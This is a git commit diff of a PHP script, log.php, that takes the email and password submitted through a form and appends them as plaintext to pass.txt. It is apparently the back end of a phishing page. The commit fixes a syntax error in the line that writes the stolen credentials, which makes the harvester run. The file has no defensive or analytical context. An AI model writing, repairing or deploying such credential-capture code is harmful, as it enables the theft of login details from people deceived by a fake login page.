6457db872d6cb2740ad4a617ebfabb9a7b5d3f48
nerdhacker000 <114361549+nerdhacker000@users.noreply.github.com>
2022-09-25 21:20:20 +0000

    Update log.php

--- log.php
+++ log.php
@@ -2,6 +2,6 @@
 $input1=$_POST["email"];
 $input2=$_POST["pass"];
 $fp=fopen("pass.txt","a+");
-$msg="\nUsername:"$input1." Password:".$input2."\n";
+$msg="\nUsername:".$input1." Password:".$input2."\n";
 fwrite($fp, $msg);
 ?>
